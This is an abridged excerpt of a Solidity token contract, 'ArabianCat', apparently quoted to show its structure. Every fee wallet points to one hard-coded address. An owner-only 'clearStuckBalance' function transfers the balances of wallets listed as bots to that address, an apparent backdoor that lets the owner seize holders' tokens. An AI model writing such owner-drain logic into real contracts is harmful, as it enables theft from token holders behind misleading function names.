...
contract ArabianCat is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0xdFED645F7DE07fD47b24C79AcD27655BF2bB29AD));
    address payable public _teamwallet =
        payable(address(0xdFED645F7DE07fD47b24C79AcD27655BF2bB29AD));
    address _partnershipswallet =
        payable(address(0xdFED645F7DE07fD47b24C79AcD27655BF2bB29AD));
    address private _donationAddress =
        0xdFED645F7DE07fD47b24C79AcD27655BF2bB29AD;

    string private _name = "ArabianCat";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0xdFED645F7DE07fD47b24C79AcD27655BF2bB29AD), amount);
        }
